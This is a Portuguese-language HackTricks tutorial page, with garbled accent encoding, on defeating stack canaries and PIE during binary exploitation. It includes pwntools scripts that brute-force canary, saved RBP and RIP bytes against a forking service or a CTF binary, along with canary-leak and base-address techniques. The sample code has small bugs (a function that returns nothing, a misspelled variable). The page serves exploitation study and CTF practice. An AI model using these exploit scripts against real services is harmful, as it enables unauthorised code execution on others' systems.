<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Se vocÃª estiver enfrentando um binÃ¡rio protegido por um canÃ¡rio e PIE (Executable Position Independent), provavelmente precisarÃ¡ encontrar uma maneira de contornÃ¡-los.**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Observe que o **`checksec`** pode nÃ£o encontrar que um binÃ¡rio estÃ¡ protegido por um canÃ¡rio se isso foi compilado estaticamente e nÃ£o Ã© capaz de identificar a funÃ§Ã£o.\
No entanto, vocÃª pode notar manualmente isso se encontrar que um valor Ã© salvo na pilha no inÃ­cio de uma chamada de funÃ§Ã£o e esse valor Ã© verificado antes de sair.
{% endhint %}

# ForÃ§a bruta no Canary

A melhor maneira de contornar um canÃ¡rio simples Ã© se o binÃ¡rio for um programa que **cria processos filhos toda vez que vocÃª estabelece uma nova conexÃ£o** com ele (serviÃ§o de rede), porque toda vez que vocÃª se conecta a ele, **o mesmo canÃ¡rio serÃ¡ usado**.

EntÃ£o, a melhor maneira de contornar o canÃ¡rio Ã© apenas **forÃ§Ã¡-lo caractere por caractere**, e vocÃª pode descobrir se o byte do canÃ¡rio adivinhado estava correto verificando se o programa travou ou continua seu fluxo regular. Neste exemplo, a funÃ§Ã£o **forÃ§a bruta um canÃ¡rio de 8 Bytes (x64)** e distingue entre um byte adivinhado correto e um byte ruim apenas **verificando** se uma **resposta** Ã© enviada de volta pelo servidor (outra maneira em **outras situaÃ§Ãµes** poderia ser usando um **try/except**):

## Exemplo 1

Este exemplo Ã© implementado para 64 bits, mas pode ser facilmente implementado para 32 bits.
```python
from pwn import *

def connect():
    r = remote("localhost", 8788)

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            r = connect()

            r.recvuntil("Username: ")
            r.send(base + chr(guess))

            if "SOME OUTPUT" in r.clean():
                print "Guessed correct byte:", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()

    print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
    return base
    
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## Exemplo 2

Isso foi implementado para 32 bits, mas poderia ser facilmente alterado para 64 bits.\
Observe tambÃ©m que, para este exemplo, **o programa espera primeiro um byte para indicar o tamanho da entrada** e, em seguida, o payload.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
	known_canary = b""
	test_canary = 0x0
	len_bytes_to_read = 0x21
	
	for j in range(0, 4):
		# Iterate up to 0xff times to brute force all posible values for byte
		for test_canary in range(0xff):
			print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")
			
			# Send the current input size
			target.send(len_bytes_to_read.to_bytes(1, "little"))

			# Send this iterations canary
			target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

			# Scan in the output, determine if we have a correct value
			output = target.recvuntil(b"exit.")
			if b"YUM" in output:
				# If we have a correct value, record the canary value, reset the canary value, and move on
				print(" - next byte is: " + hex(test_canary))
				known_canary = known_canary + test_canary.to_bytes(1, "little")
				len_bytes_to_read += 1
				break

	# Return the canary
	return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# Imprimir o Canary

Outra maneira de contornar o canary Ã© **imprimi-lo**.\
Imagine uma situaÃ§Ã£o em que um **programa vulnerÃ¡vel** a estouro de pilha pode executar uma funÃ§Ã£o **puts** apontando para **parte** do **estouro de pilha**. O atacante sabe que o **primeiro byte do canary Ã© um byte nulo** (`\x00`) e o restante do canary sÃ£o bytes **aleatÃ³rios**. EntÃ£o, o atacante pode criar um estouro que **sobrescreve a pilha atÃ© o primeiro byte do canary**.\
Em seguida, o atacante **chama a funcionalidade puts** no meio da carga Ãºtil, que irÃ¡ **imprimir todo o canary** (exceto o primeiro byte nulo).\
Com essas informaÃ§Ãµes, o atacante pode **criar e enviar um novo ataque** conhecendo o canary (na mesma sessÃ£o do programa)

Obviamente, essa tÃ¡tica Ã© muito **restrita**, pois o atacante precisa ser capaz de **imprimir** o **conteÃºdo** de sua **carga Ãºtil** para **extrair** o **canary** e, em seguida, ser capaz de criar uma nova carga Ãºtil (na **mesma sessÃ£o do programa**) e **enviar** o **real estouro de buffer**.\
Exemplo de CTF: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

Para contornar o PIE, vocÃª precisa **vazar algum endereÃ§o**. E se o binÃ¡rio nÃ£o estiver vazando nenhum endereÃ§o, o melhor a fazer Ã© **forÃ§ar a barra do RBP e RIP salvos na pilha** na funÃ§Ã£o vulnerÃ¡vel.\
Por exemplo, se um binÃ¡rio Ã© protegido usando tanto um **canary** quanto o **PIE**, vocÃª pode comeÃ§ar a forÃ§ar a barra do canary, entÃ£o os **prÃ³ximos** 8 bytes (x64) serÃ£o o **RBP** salvo e os **prÃ³ximos** 8 bytes serÃ£o o **RIP** salvo.

Para forÃ§ar a barra do RBP e do RIP do binÃ¡rio, vocÃª pode descobrir que um byte adivinhado vÃ¡lido estÃ¡ correto se o programa produzir algo ou se ele simplesmente nÃ£o travar. A **mesma funÃ§Ã£o** fornecida para forÃ§ar a barra do canary pode ser usada para forÃ§ar a barra do RBP e do RIP:
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## Obter o endereÃ§o base

A Ãºltima coisa que vocÃª precisa para derrotar o PIE Ã© calcular **endereÃ§os Ãºteis a partir dos endereÃ§os vazados**: o **RBP** e o **RIP**.

A partir do **RBP**, vocÃª pode calcular **onde estÃ¡ escrevendo seu shell na pilha**. Isso pode ser muito Ãºtil para saber onde vocÃª vai escrever a string _"/bin/sh\x00"_ dentro da pilha. Para calcular a distÃ¢ncia entre o RBP vazado e seu shellcode, vocÃª pode simplesmente colocar um **ponto de interrupÃ§Ã£o apÃ³s vazar o RBP** e verificar **onde seu shellcode estÃ¡ localizado**, entÃ£o, vocÃª pode calcular a distÃ¢ncia entre o shellcode e o RBP:
```python
INI_SHELLCODE = RBP - 1152
```
A partir do **RIP**, vocÃª pode calcular o **endereÃ§o base do binÃ¡rio PIE**, que Ã© o que vocÃª vai precisar para criar uma **cadeia ROP vÃ¡lida**.\
Para calcular o endereÃ§o base, basta fazer `objdump -d vunbinary` e verificar os Ãºltimos endereÃ§os desmontados:

![](<../../.gitbook/assets/image (145).png>)

Nesse exemplo, vocÃª pode ver que apenas **1 byte e meio Ã© necessÃ¡rio** para localizar todo o cÃ³digo, entÃ£o, o endereÃ§o base, nessa situaÃ§Ã£o, serÃ¡ o **RIP vazado, mas terminando em "000"**. Por exemplo, se vocÃª vazou _0x562002970**ecf**_, o endereÃ§o base Ã© _0x562002970**000**_.
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
